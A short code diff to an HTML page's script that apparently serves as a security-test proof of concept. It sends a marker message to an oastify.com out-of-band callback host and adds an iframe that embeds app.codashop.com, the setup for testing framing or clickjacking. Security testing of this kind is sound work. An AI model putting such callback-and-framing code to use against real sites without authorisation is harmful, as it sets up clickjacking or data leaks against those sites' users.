@@ -21,7 +21,7 @@
             var url = 'https://xyzhudzjlsjif311zcaevrn2jtpkdb10.oastify.com';
 
             // Define the text to send
-            var textToSend = 'Hello, World!';
+            var textToSend = 'Hello, I got iframe';
 
             // Set up the request
             xhr.open('POST', url, true);
@@ -29,6 +29,11 @@
 
             // Send the text
             xhr.send(textToSend);
+
+            // Create and append the iframe
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://app.codashop.com';
+            document.body.appendChild(iframe);
         });
     </script>
 </body>
